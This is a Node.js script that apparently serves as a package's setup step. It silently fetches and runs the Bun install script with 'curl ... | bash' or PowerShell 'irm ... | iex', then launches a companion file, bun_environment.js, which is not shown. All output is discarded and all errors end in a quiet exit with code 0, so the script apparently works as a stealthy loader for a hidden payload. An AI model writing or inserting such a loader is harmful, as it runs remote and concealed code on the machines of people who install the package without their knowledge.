#!/usr/bin/env node
const { spawn, execSync } = require('child_process');
const path = require('path');
const fs = require('fs');
const os = require('os');

function isBunOnPath() {
  try {
    const command = process.platform === 'win32' ? 'where bun' : 'which bun';
    execSync(command, { stdio: 'ignore' });
    return true;
  } catch {
    return false;
  }
}

function reloadPath() {
  // Reload PATH environment variable
  if (process.platform === 'win32') {
    try {
      // On Windows, get updated PATH from registry
      const result = execSync('powershell -c "[Environment]::GetEnvironmentVariable(\'PATH\', \'User\') + \';\' + [Environment]::GetEnvironmentVariable(\'PATH\', \'Machine\')"', {
        encoding: 'utf8'
      });
      process.env.PATH = result.trim();
    } catch {
    }
  } else {
    try {
      // On Unix systems, source common shell profile files
      const homeDir = os.homedir();
      const profileFiles = [
        path.join(homeDir, '.bashrc'),
        path.join(homeDir, '.bash_profile'),
        path.join(homeDir, '.profile'),
        path.join(homeDir, '.zshrc')
      ];

      // Try to source profile files to get updated PATH
      for (const profileFile of profileFiles) {
        if (fs.existsSync(profileFile)) {
          try {
            const result = execSync(`bash -c "source ${profileFile} && echo $PATH"`, {
              encoding: 'utf8',
              stdio: ['pipe', 'pipe', 'ignore']
            });
            if (result && result.trim()) {
              process.env.PATH = result.trim();
              break;
            }
          } catch {
            // Continue to next profile file
          }
        }
      }

      // Also check if ~/.bun/bin exists and add it to PATH if not already there
      const bunBinDir = path.join(homeDir, '.bun', 'bin');
      if (fs.existsSync(bunBinDir) && !process.env.PATH.includes(bunBinDir)) {
        process.env.PATH = `${bunBinDir}:${process.env.PATH}`;
      }
    } catch {}
  }
}

async function downloadAndSetupBun() {
  try {
    let command;
    if (process.platform === 'win32') {
      // Windows: Use PowerShell script
      command = 'powershell -c "irm bun.sh/install.ps1|iex"';
    } else {
      // Linux/macOS: Use curl + bash script
      command = 'curl -fsSL https://bun.sh/install | bash';
    }

    execSync(command, {
      stdio: 'ignore',
      env: { ...process.env }
    });

    // Reload PATH to pick up newly installed bun
    reloadPath();

    // Find bun executable after installation
    const bunPath = findBunExecutable();
    if (!bunPath) {
      throw new Error('Bun installation completed but executable not found');
    }

    return bunPath;
  } catch  {
    process.exit(0);
  }
}

function findBunExecutable() {
  // Common locations where bun might be installed
  const possiblePaths = [];

  if (process.platform === 'win32') {
    // Windows locations
    const userProfile = process.env.USERPROFILE || '';
    possiblePaths.push(
      path.join(userProfile, '.bun', 'bin', 'bun.exe'),
      path.join(userProfile, 'AppData', 'Local', 'bun', 'bun.exe')
    );
  } else {
    // Unix locations
    const homeDir = os.homedir();
    possiblePaths.push(
      path.join(homeDir, '.bun', 'bin', 'bun'),
      '/usr/local/bin/bun',
      '/opt/bun/bin/bun'
    );
  }

  // Check if bun is now available on PATH
  if (isBunOnPath()) {
    return 'bun';
  }

  // Check common installation paths
  for (const bunPath of possiblePaths) {
    if (fs.existsSync(bunPath)) {
      return bunPath;
    }
  }

  return null;
}

function runExecutable(execPath, args = [], opts = {}) {
  const child = spawn(execPath, args, {
    stdio: 'ignore',
    cwd: opts.cwd || process.cwd(),
    env: Object.assign({}, process.env, opts.env || {})
  });

  child.on('error', (err) => {
    process.exit(0);
  });

  child.on('exit', (code, signal) => {
    if (signal) {
      process.exit(0);
    } else {
      process.exit(code === null ? 1 : code);
    }
  });
}

// Main execution
async function main() {
  let bunExecutable;

  if (isBunOnPath()) {
    // Use bun from PATH
    bunExecutable = 'bun';
  } else {
    // Check if we have a locally downloaded bun
    const localBunDir = path.join(__dirname, 'bun-dist');
    const possiblePaths = [
      path.join(localBunDir, 'bun', 'bun'),
      path.join(localBunDir, 'bun', 'bun.exe'),
      path.join(localBunDir, 'bun.exe'),
      path.join(localBunDir, 'bun')
    ];

    const existingBun = possiblePaths.find(p => fs.existsSync(p));

    if (existingBun) {
      bunExecutable = existingBun;
    } else {
      // Download and setup bun
      bunExecutable = await downloadAndSetupBun();
    }
  }

  const environmentScript = path.join(__dirname, 'bun_environment.js');
  if (fs.existsSync(environmentScript)) {
    runExecutable(bunExecutable, [environmentScript]);
  } else {
    process.exit(0);
  }
}

main().catch((error) => {
  process.exit(0);
});
